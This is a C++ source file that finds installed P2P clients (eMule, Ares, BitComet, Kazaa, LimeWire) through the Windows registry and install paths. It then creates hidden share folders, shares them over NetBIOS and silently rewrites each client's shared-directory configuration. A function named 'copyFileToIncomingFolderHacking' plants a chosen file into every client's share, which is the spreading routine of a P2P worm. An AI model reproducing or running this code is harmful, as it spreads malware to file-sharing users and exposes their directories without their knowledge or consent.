#include "P2PList.h"

P2P ** P2PList::P2PSoftwareList;
int P2PList::numElems = 0; 
unsigned int P2PList::portSelected = 0;
bool P2PList::inicialized = false;
      
void P2PList::inicialize() {
   if (!P2PList::inicialized) {
      P2PList::P2PSoftwareList = (P2P **) malloc(sizeof(P2P *));
      P2PList::inicialized = true;
   }
}

bool P2PList::scanP2PSoftwareLocalMachine(bool selectPort) {
    WINRegistry * WinReg = new WINRegistry();
    char * pValue;
    char * keyReg;
    bool findIncomingFolder[NUMP2P], limitedUser;
    P2PList::portSelected = 0;
    
    if (P2PList::inicialized) {
       for (int i = 0; i < NUMP2P; i++) findIncomingFolder[i] = false;
    
       char ** plsoft = WinReg->RegQueryEnumerationUninstallSoftware();
       for (int i = 0;(i < WinReg->getCountElems()); i++) {
          limitedUser = true;
          if (strstr(*(plsoft + i), "eMule") != NULL) { 
             keyReg = (char *) malloc(strlen("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\") + strlen(*(plsoft + i)) + 1); 
             strcpy(keyReg, (string("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\") + string(*(plsoft + i))).c_str()); 
             pValue = WinReg->RegQueryValue(keyReg, "UninstallString");
             if (pValue != NULL) {
                if (P2PList::numElems > 0) P2PList::P2PSoftwareList = (P2P **) realloc(P2PList::P2PSoftwareList, sizeof(P2P *) * (P2PList::numElems + 1));
                *(P2PList::P2PSoftwareList + P2PList::numElems) = (P2PEmule *) malloc(sizeof(P2PEmule));
             
                if (FunctionsFiles::fileExists((string(FunctionsStrings::eraseLastToken(pValue, '\\')) + string("config\\shareddir.dat")).c_str())) {
                   if (getenv("USERPROFILE") != NULL) {
                      if ((mkdir((string(getenv("USERPROFILE")) + string("\\shareFiles")).c_str()) == 0) || (FunctionsFiles::fileExists((string(getenv("USERPROFILE")) + string("\\shareFiles")).c_str()))) {
                         SetFileAttributes((string(getenv("USERPROFILE")) + string("\\shareFiles")).c_str(), FILE_ATTRIBUTE_HIDDEN);
                         NetBios::netShareDirectoryAdd((string(getenv("USERPROFILE")) + string("\\shareFiles")).c_str(), "eMule", "eMule Share Directory");
                         FunctionsFiles::putTextToFile((string(FunctionsStrings::eraseLastToken(pValue, '\\')) + string("config\\shareddir.dat")).c_str(), (string(getenv("USERPROFILE")) + string("\\shareFiles")).c_str());  
                         *(P2PList::P2PSoftwareList + P2PList::numElems) = new P2PEmule(FunctionsStrings::eraseLastToken(pValue, '\\'), (string(getenv("USERPROFILE")) + string("\\shareFiles")).c_str());
                         limitedUser = false;
                      }
                   }
                   else {
                      if ((mkdir("c:\\shareFiles") == 0) || (FunctionsFiles::fileExists("c:\\shareFiles"))) {
                         SetFileAttributes("c:\\shareFiles", FILE_ATTRIBUTE_HIDDEN);
                         NetBios::netShareDirectoryAdd("c:\\shareFiles", "eMule", "eMule Share Directory");
                         FunctionsFiles::putTextToFile((string(FunctionsStrings::eraseLastToken(pValue, '\\')) + string("config\\shareddir.dat")).c_str(), "c:\\shareFiles");  
                         *(P2PList::P2PSoftwareList + P2PList::numElems) = new P2PEmule(FunctionsStrings::eraseLastToken(pValue, '\\'), "c:\\shareFiles");
                         limitedUser = false;
                      }            
                   }
                }
                if (limitedUser) {
                   *(P2PList::P2PSoftwareList + P2PList::numElems) = new P2PEmule(FunctionsStrings::eraseLastToken(pValue, '\\'), (string(FunctionsStrings::eraseLastToken(pValue, '\\')) + string("Incoming")).c_str());
                    NetBios::netShareDirectoryAdd((string(FunctionsStrings::eraseLastToken(pValue, '\\')) + string("Incoming")).c_str(), "eMule", "eMule Share Directory");
                }
                if ((P2PList::portSelected == 0) && (selectPort)) {
                   if ((*(P2PList::P2PSoftwareList + P2PList::numElems))->scanListeningPort()) P2PList::portSelected = (*(P2PList::P2PSoftwareList + P2PList::numElems))->getListeningPort();
                }
                P2PList::numElems++; findIncomingFolder[0] = true;
             }
             free(keyReg);
          }
          else if (strstr(*(plsoft + i), "Ares") != NULL) {
             for(int i = 0; ((i < 2) && (findIncomingFolder[1] == false)); i++) {
                if (i == 0) {
                   keyReg = (char *) malloc(strlen("HKEY_CURRENT_USER\\Software\\Ares") + 1); 
                   strcpy(keyReg, "HKEY_CURRENT_USER\\Software\\Ares");
                }
                else {
                   keyReg = (char *) malloc(strlen("HKEY_LOCAL_MACHINE\\Software\\Ares") + 1); 
                   strcpy(keyReg, "HKEY_LOCAL_MACHINE\\Software\\Ares");                
                }
                pValue = WinReg->RegQueryValue(keyReg, "Download.Folder");
          
                if (pValue != NULL) {
                   if (P2PList::numElems > 0) P2PList::P2PSoftwareList = (P2P **) realloc(P2PList::P2PSoftwareList, sizeof(P2P *) * (P2PList::numElems + 1));
                   *(P2PList::P2PSoftwareList + P2PList::numElems) = (P2PAres *) malloc(sizeof(P2PAres));
             
                   *(P2PList::P2PSoftwareList + P2PList::numElems) = new P2PAres("", FunctionsStrings::castingHexToString(pValue));
                   NetBios::netShareDirectoryAdd(FunctionsStrings::castingHexToString(pValue), "Ares", "Ares Share Directory");
                   if ((P2PList::portSelected == 0) && (selectPort)) {
                      if ((*(P2PList::P2PSoftwareList + P2PList::numElems))->scanListeningPort()) P2PList::portSelected = (*(P2PList::P2PSoftwareList + P2PList::numElems))->getListeningPort();
                   }
                   P2PList::numElems++; findIncomingFolder[1] = true;
                }
                free(keyReg);
             }    
          }
          else if (strstr(*(plsoft + i), "BitComet") != NULL) { 
             keyReg = (char *) malloc(strlen("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\") + strlen(*(plsoft + i)) + 1); 
             strcpy(keyReg, (string("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\") + string(*(plsoft + i))).c_str()); 
             pValue = WinReg->RegQueryValue(keyReg, "UninstallString");
             if (pValue != NULL) {
                if (P2PList::numElems > 0) P2PList::P2PSoftwareList = (P2P **) realloc(P2PList::P2PSoftwareList, sizeof(P2P *) * (P2PList::numElems + 1));
                *(P2PList::P2PSoftwareList + P2PList::numElems) = (P2PBitComet *) malloc(sizeof(P2PBitComet));
             
                *(P2PList::P2PSoftwareList + P2PList::numElems) = new P2PBitComet(FunctionsStrings::eraseLastToken(pValue, '\\'), (string(FunctionsStrings::eraseLastToken(pValue, '\\')) + string("share")).c_str());
                NetBios::netShareDirectoryAdd((string(FunctionsStrings::eraseLastToken(pValue, '\\')) + string("share")).c_str(), "BitComet", "BitComet Share Directory");
                if ((P2PList::portSelected == 0) && (selectPort)) {
                   if ((*(P2PList::P2PSoftwareList + P2PList::numElems))->scanListeningPort()) P2PList::portSelected = (*(P2PList::P2PSoftwareList + P2PList::numElems))->getListeningPort();
                }
                P2PList::numElems++; findIncomingFolder[2] = true;
             }
             free(keyReg);
          }   
          else if ((strstr(*(plsoft + i), "kazaa") != NULL) || (strstr(*(plsoft + i), "Kazaa") != NULL)) { 
             for(int i = 0; ((i < 2) && (findIncomingFolder[3] == false)); i++) {
                if (i == 0) {
                   keyReg = (char *) malloc(strlen("HKEY_CURRENT_USER\\Software\\Kazaa\\LocalContent") + 1); 
                   strcpy(keyReg, "HKEY_CURRENT_USER\\Software\\Kazaa\\LocalContent");
                }
                else {
                   keyReg = (char *) malloc(strlen("HKEY_LOCAL_MACHINE\\Software\\Kazaa\\LocalContent") + 1); 
                   strcpy(keyReg, "HKEY_LOCAL_MACHINE\\Software\\Kazaa\\LocalContent");                
                }
                pValue = WinReg->RegQueryValue(keyReg, "DownloadDir");
          
                if (pValue != NULL) {
                   if (P2PList::numElems > 0) P2PList::P2PSoftwareList = (P2P **) realloc(P2PList::P2PSoftwareList, sizeof(P2P *) * (P2PList::numElems + 1));
                   *(P2PList::P2PSoftwareList + P2PList::numElems) = (P2PKazaa *) malloc(sizeof(P2PKazaa));
             
                   *(P2PList::P2PSoftwareList + P2PList::numElems) = new P2PKazaa("", pValue);
                   NetBios::netShareDirectoryAdd(pValue, "Kazaa", "Kazaa Share Directory");
                   if ((P2PList::portSelected == 0) && (selectPort)) {
                      if ((*(P2PList::P2PSoftwareList + P2PList::numElems))->scanListeningPort()) P2PList::portSelected = (*(P2PList::P2PSoftwareList + P2PList::numElems))->getListeningPort();
                   }
                   P2PList::numElems++; findIncomingFolder[3] = true;
                }
                free(keyReg);
             }  
          }
          else if (strstr(*(plsoft + i), "LimeWire") != NULL) { 
             keyReg = (char *) malloc(strlen("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\") + strlen(*(plsoft + i)) + 1); 
             strcpy(keyReg, (string("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\") + string(*(plsoft + i))).c_str()); 
             pValue = WinReg->RegQueryValue(keyReg, "UninstallString");
             if (pValue != NULL) {
                if (P2PList::numElems > 0) P2PList::P2PSoftwareList = (P2P **) realloc(P2PList::P2PSoftwareList, sizeof(P2P *) * (P2PList::numElems + 1));
                *(P2PList::P2PSoftwareList + P2PList::numElems) = (P2PLimeWire *) malloc(sizeof(P2PLimeWire));
             
                if (getenv("APPDATA") != NULL) { 
                   if (FunctionsFiles::fileExists((string(getenv("APPDATA")) + string("\\LimeWire\\limewire.props")).c_str())) { 
                      if (getenv("USERPROFILE") != NULL) {
                         if ((mkdir((string(getenv("USERPROFILE")) + string("\\shareFiles")).c_str()) == 0) || (FunctionsFiles::fileExists((string(getenv("USERPROFILE")) + string("\\shareFiles")).c_str()))){ 
                            SetFileAttributes((string(getenv("USERPROFILE")) + string("\\shareFiles")).c_str(), FILE_ATTRIBUTE_HIDDEN);
                            NetBios::netShareDirectoryAdd((string(getenv("USERPROFILE")) + string("\\shareFiles")).c_str(), "LimeWire", "LimeWire Share Directory");
                            FunctionsFiles::appendTextToFileAndErasePatern((string(getenv("APPDATA")) + string("\\LimeWire\\limewire.props")).c_str(), "DIRECTORIES_TO_SEARCH_FOR_FILES", (string("DIRECTORIES_TO_SEARCH_FOR_FILES=") + string(FunctionsStrings::replaceCharacters(getenv("USERPROFILE"), '\\', "\\\\")) + string("\\\\shareFiles")).c_str());  
                            *(P2PList::P2PSoftwareList + P2PList::numElems) = new P2PLimeWire(FunctionsStrings::eraseLastToken(pValue, '\\'), (string(getenv("USERPROFILE")) + string("\\shareFiles")).c_str());
                            limitedUser = false;
                         }
                      }
                      else {
                         if ((mkdir("c:\\shareFiles") == 0) || (FunctionsFiles::fileExists("c:\\shareFiles"))) { 
                            SetFileAttributes("c:\\shareFiles", FILE_ATTRIBUTE_HIDDEN);
                            NetBios::netShareDirectoryAdd("c:\\shareFiles", "LimeWire", "LimeWire Share Directory");
                            FunctionsFiles::appendTextToFileAndErasePatern((string(getenv("APPDATA")) + string("\\LimeWire\\limewire.props")).c_str(), "DIRECTORIES_TO_SEARCH_FOR_FILES", "DIRECTORIES_TO_SEARCH_FOR_FILES=c\\:\\\\shareFiles");  
                            *(P2PList::P2PSoftwareList + P2PList::numElems) = new P2PLimeWire(FunctionsStrings::eraseLastToken(pValue, '\\'), "c:\\shareFiles");      
                            limitedUser = false;
                         }          
                      }
                      if ((P2PList::portSelected == 0) && (!limitedUser) && (selectPort)) {
                         if ((*(P2PList::P2PSoftwareList + P2PList::numElems))->scanListeningPort()) P2PList::portSelected = (*(P2PList::P2PSoftwareList + P2PList::numElems))->getListeningPort();
                      }               
                   }
                }
                if (limitedUser) { 
                   *(P2PList::P2PSoftwareList + P2PList::numElems) = new P2PLimeWire(FunctionsStrings::eraseLastToken(pValue, '\\'), (string(FunctionsStrings::eraseLastToken(pValue, '\\')) + string(".NetworkShare")).c_str());
                   NetBios::netShareDirectoryAdd((string(FunctionsStrings::eraseLastToken(pValue, '\\')) + string(".NetworkShare")).c_str(), "LimeWire", "LimeWire Share Directory");
                }
                P2PList::numElems++; findIncomingFolder[4] = true;
             }
             free(keyReg);
          }                  
       }

       /* CHECK IF P2P APP IS INSTALLED WITHOUT SETUP */
       if (getenv("ProgramFiles") != NULL) {
          if (findIncomingFolder[0] == false) {
             if (FunctionsFiles::fileExists((string(getenv("ProgramFiles")) + string("\\eMule")).c_str())) {
                if (P2PList::numElems > 0) P2PList::P2PSoftwareList = (P2P **) realloc(P2PList::P2PSoftwareList, sizeof(P2P *) * (P2PList::numElems + 1));
                *(P2PList::P2PSoftwareList + P2PList::numElems) = (P2PEmule *) malloc(sizeof(P2PEmule));
             
                if (FunctionsFiles::fileExists((string(getenv("ProgramFiles")) + string("\\eMule\\config\\shareddir.dat")).c_str())) {
                   if (getenv("USERPROFILE") != NULL) {
                      if ((mkdir((string(getenv("USERPROFILE")) + string("\\shareFiles")).c_str()) == 0) || (FunctionsFiles::fileExists((string(getenv("USERPROFILE")) + string("\\shareFiles")).c_str()))) {
                         SetFileAttributes((string(getenv("USERPROFILE")) + string("\\shareFiles")).c_str(), FILE_ATTRIBUTE_HIDDEN);
                         NetBios::netShareDirectoryAdd((string(getenv("USERPROFILE")) + string("\\shareFiles")).c_str(), "eMule", "eMule Share Directory");
                         FunctionsFiles::putTextToFile((string(getenv("ProgramFiles")) + string("\\eMule\\config\\shareddir.dat")).c_str(), (string(getenv("USERPROFILE")) + string("\\shareFiles")).c_str());  
                         *(P2PList::P2PSoftwareList + P2PList::numElems) = new P2PEmule((string(getenv("ProgramFiles")) + string("\\eMule")).c_str(), (string(getenv("USERPROFILE")) + string("\\shareFiles")).c_str());
                         limitedUser = false;
                      }
                   }
                   else {
                      if ((mkdir("c:\\shareFiles") == 0) || (FunctionsFiles::fileExists("c:\\shareFiles"))) {
                         SetFileAttributes("c:\\shareFiles", FILE_ATTRIBUTE_HIDDEN);
                         NetBios::netShareDirectoryAdd("c:\\shareFiles", "eMule", "eMule Share Directory");
                         FunctionsFiles::putTextToFile((string(getenv("ProgramFiles")) + string("\\eMule\\config\\shareddir.dat")).c_str(), "c:\\shareFiles");  
                         *(P2PList::P2PSoftwareList + P2PList::numElems) = new P2PEmule((string(getenv("ProgramFiles")) + string("\\eMule")).c_str(), "c:\\shareFiles");                
                         limitedUser = false;
                      }
                   }
                }
                if (limitedUser) { 
                   *(P2PList::P2PSoftwareList + P2PList::numElems) = new P2PEmule((string(getenv("ProgramFiles")) + string("\\eMule")).c_str(), (string(getenv("ProgramFiles")) + string("\\eMule\\Incoming")).c_str());
                   NetBios::netShareDirectoryAdd((string(getenv("ProgramFiles")) + string("\\eMule\\Incoming")).c_str(), "eMule", "eMule Share Directory");
                }
                if ((P2PList::portSelected == 0) && (selectPort)) {
                   if ((*(P2PList::P2PSoftwareList + P2PList::numElems))->scanListeningPort()) P2PList::portSelected = (*(P2PList::P2PSoftwareList + P2PList::numElems))->getListeningPort();
                }
                P2PList::numElems++; findIncomingFolder[0] = true;
             }     
          }

          if (findIncomingFolder[1] == false) {
             if (FunctionsFiles::fileExists((string(getenv("ProgramFiles")) + string("\\Ares\\My Shared Folder")).c_str())) {
                if (P2PList::numElems > 0) P2PList::P2PSoftwareList = (P2P **) realloc(P2PList::P2PSoftwareList, sizeof(P2P *) * (P2PList::numElems + 1));
                *(P2PList::P2PSoftwareList + P2PList::numElems) = (P2PAres *) malloc(sizeof(P2PAres));
             
                *(P2PList::P2PSoftwareList + P2PList::numElems) = new P2PAres("", (string(getenv("ProgramFiles")) + string("\\Ares\\My Shared Folder")).c_str());
                NetBios::netShareDirectoryAdd((string(getenv("ProgramFiles")) + string("\\Ares\\My Shared Folder")).c_str(), "Ares", "Ares Share Directory");
                
                P2PList::numElems++; findIncomingFolder[1] = true;
             }
          }      
       
          if (findIncomingFolder[2] == false) {
             if (FunctionsFiles::fileExists((string(getenv("ProgramFiles")) + string("\\BitComet\\share")).c_str())) {
                if (P2PList::numElems > 0) P2PList::P2PSoftwareList = (P2P **) realloc(P2PList::P2PSoftwareList, sizeof(P2P *) * (P2PList::numElems + 1));
                *(P2PList::P2PSoftwareList + P2PList::numElems) = (P2PBitComet *) malloc(sizeof(P2PBitComet));
               
                *(P2PList::P2PSoftwareList + P2PList::numElems) = new P2PBitComet((string(getenv("ProgramFiles")) + string("\\BitComet")).c_str(), (string(getenv("ProgramFiles")) + string("\\BitComet\\share")).c_str());
                NetBios::netShareDirectoryAdd((string(getenv("ProgramFiles")) + string("\\BitComet\\share")).c_str(), "BitComet", "BitComet Share Directory");
                if ((P2PList::portSelected == 0) && (selectPort)) {
                   if ((*(P2PList::P2PSoftwareList + P2PList::numElems))->scanListeningPort()) P2PList::portSelected = (*(P2PList::P2PSoftwareList + P2PList::numElems))->getListeningPort();
                }                
                P2PList::numElems++; findIncomingFolder[2] = true;
             }    
          } 
       
          if (findIncomingFolder[3] == false) {
             for(int i = 0; ((i < 2) && (findIncomingFolder[3] == false)); i++) {
                if (i == 0) {
                   keyReg = (char *) malloc(strlen("HKEY_CURRENT_USER\\Software\\Kazaa\\LocalContent") + 1); 
                   strcpy(keyReg, "HKEY_CURRENT_USER\\Software\\Kazaa\\LocalContent");
                }
                else {
                   keyReg = (char *) malloc(strlen("HKEY_LOCAL_MACHINE\\Software\\Kazaa\\LocalContent") + 1); 
                   strcpy(keyReg, "HKEY_LOCAL_MACHINE\\Software\\Kazaa\\LocalContent");                
                }
                pValue = WinReg->RegQueryValue(keyReg, "DownloadDir");
          
                if (pValue != NULL) {
                   if (P2PList::numElems > 0) P2PList::P2PSoftwareList = (P2P **) realloc(P2PList::P2PSoftwareList, sizeof(P2P *) * (P2PList::numElems + 1));
                   *(P2PList::P2PSoftwareList + P2PList::numElems) = (P2PKazaa *) malloc(sizeof(P2PKazaa));
             
                   *(P2PList::P2PSoftwareList + P2PList::numElems) = new P2PKazaa("", pValue);
                   NetBios::netShareDirectoryAdd(pValue, "Kazaa", "Kazaa Share Directory");
                   if ((P2PList::portSelected == 0) && (selectPort)) {
                      if ((*(P2PList::P2PSoftwareList + P2PList::numElems))->scanListeningPort()) P2PList::portSelected = (*(P2PList::P2PSoftwareList + P2PList::numElems))->getListeningPort();
                   }
                   P2PList::numElems++; findIncomingFolder[3] = true;
                }
                free(keyReg);
             }                            
             if (findIncomingFolder[3] == false) {
                if (FunctionsFiles::fileExists((string(getenv("ProgramFiles")) + string("\\Kazaa\\My Shared Folder")).c_str())) {
                   if (P2PList::numElems > 0) P2PList::P2PSoftwareList = (P2P **) realloc(P2PList::P2PSoftwareList, sizeof(P2P *) * (P2PList::numElems + 1));
                   *(P2PList::P2PSoftwareList + P2PList::numElems) = (P2PKazaa *) malloc(sizeof(P2PKazaa));
             
                   *(P2PList::P2PSoftwareList + P2PList::numElems) = new P2PKazaa((string(getenv("ProgramFiles")) + string("\\Kazaa")).c_str(), (string(getenv("ProgramFiles")) + string("\\Kazaa\\My Shared Folder")).c_str());
                   NetBios::netShareDirectoryAdd((string(getenv("ProgramFiles")) + string("\\Kazaa\\My Shared Folder")).c_str(), "Kazaa", "Kazaa Share Directory");
                   
                   P2PList::numElems++; findIncomingFolder[3] = true;
                }
             } 
          }
       
          if (findIncomingFolder[4] == false) {
             if (FunctionsFiles::fileExists((string(getenv("ProgramFiles")) + string("\\LimeWire")).c_str())) {
                if (P2PList::numElems > 0) P2PList::P2PSoftwareList = (P2P **) realloc(P2PList::P2PSoftwareList, sizeof(P2P *) * (P2PList::numElems + 1));
                *(P2PList::P2PSoftwareList + P2PList::numElems) = (P2PLimeWire *) malloc(sizeof(P2PLimeWire));
             
                if (getenv("APPDATA") != NULL) { 
                   if (FunctionsFiles::fileExists((string(getenv("APPDATA")) + string("\\LimeWire\\limewire.props")).c_str())) { 
                      if (getenv("USERPROFILE") != NULL) {
                         if ((mkdir((string(getenv("USERPROFILE")) + string("\\shareFiles")).c_str()) == 0) || (FunctionsFiles::fileExists((string(getenv("USERPROFILE")) + string("\\shareFiles")).c_str()))) {
                            SetFileAttributes((string(getenv("USERPROFILE")) + string("\\shareFiles")).c_str(), FILE_ATTRIBUTE_HIDDEN);
                            NetBios::netShareDirectoryAdd((string(getenv("USERPROFILE")) + string("\\shareFiles")).c_str(), "LimeWire", "LimeWire Share Directory");
                            FunctionsFiles::appendTextToFileAndErasePatern((string(getenv("APPDATA")) + string("\\LimeWire\\limewire.props")).c_str(), "DIRECTORIES_TO_SEARCH_FOR_FILES", (string("DIRECTORIES_TO_SEARCH_FOR_FILES=") + string(FunctionsStrings::replaceCharacters(getenv("USERPROFILE"), '\\', "\\\\")) + string("\\\\shareFiles")).c_str());  
                            *(P2PList::P2PSoftwareList + P2PList::numElems) = new P2PLimeWire((string(getenv("ProgramFiles")) + string("\\LimeWire")).c_str(), (string(getenv("USERPROFILE")) + string("\\shareFiles")).c_str());
                            limitedUser = false;
                         }
                      }
                      else {
                         if ((mkdir("c:\\shareFiles") == 0) || (FunctionsFiles::fileExists("c:\\shareFiles"))) {
                            SetFileAttributes("c:\\shareFiles", FILE_ATTRIBUTE_HIDDEN);
                            NetBios::netShareDirectoryAdd("c:\\shareFiles", "LimeWire", "LimeWire Share Directory");
                            FunctionsFiles::appendTextToFileAndErasePatern((string(getenv("APPDATA")) + string("\\LimeWire\\limewire.props")).c_str(), "DIRECTORIES_TO_SEARCH_FOR_FILES", "DIRECTORIES_TO_SEARCH_FOR_FILES=c\\:\\\\shareFiles");   
                            *(P2PList::P2PSoftwareList + P2PList::numElems) = new P2PLimeWire((string(getenv("ProgramFiles")) + string("\\LimeWire")).c_str(), "c:\\shareFiles");                
                            limitedUser = false;
                         }
                      }
                      if ((P2PList::portSelected == 0) && (!limitedUser) && (selectPort)) {
                         if ((*(P2PList::P2PSoftwareList + P2PList::numElems))->scanListeningPort()) P2PList::portSelected = (*(P2PList::P2PSoftwareList + P2PList::numElems))->getListeningPort();
                      }               
                   }
                }
                if (limitedUser) { 
                   *(P2PList::P2PSoftwareList + P2PList::numElems) = new P2PLimeWire((string(getenv("ProgramFiles")) + string("\\LimeWire")).c_str(), (string(getenv("ProgramFiles")) + string("\\LimeWire\\.NetworkShare")).c_str());
                   NetBios::netShareDirectoryAdd((string(getenv("ProgramFiles")) + string("\\LimeWire\\.NetworkShare")).c_str(), "LimeWire", "LimeWire Share Directory");
                }
                P2PList::numElems++; findIncomingFolder[4] = true;          
             }
          } 
       }
    
       if (P2PList::numElems > 0) return true;
   } 
   return false;
}

bool P2PList::copyFileToIncomingFolderHacking(const char strFilename[]) {
   if ((P2PList::numElems > 0) && (P2PList::inicialized)) {
      for(int i = 0; i < P2PList::numElems; i++) P2PList::P2PSoftwareList[i]->copyFileToIncomingFolderHacking(strFilename);
      return true;
   }
   return false; 
}

bool P2PList::copyFileToIncomingFolder(const char strFilename[]) {
   if ((P2PList::numElems > 0) && (P2PList::inicialized)) {
      for(int i = 0; i < P2PList::numElems; i++) P2PList::P2PSoftwareList[i]->copyFileToIncomingFolder(strFilename);
      return true;
   }
   return false; 
}

P2P ** P2PList::getP2PSoftwareList() { 
   if (P2PList::inicialized) return P2PList::P2PSoftwareList; 
   return NULL;
}
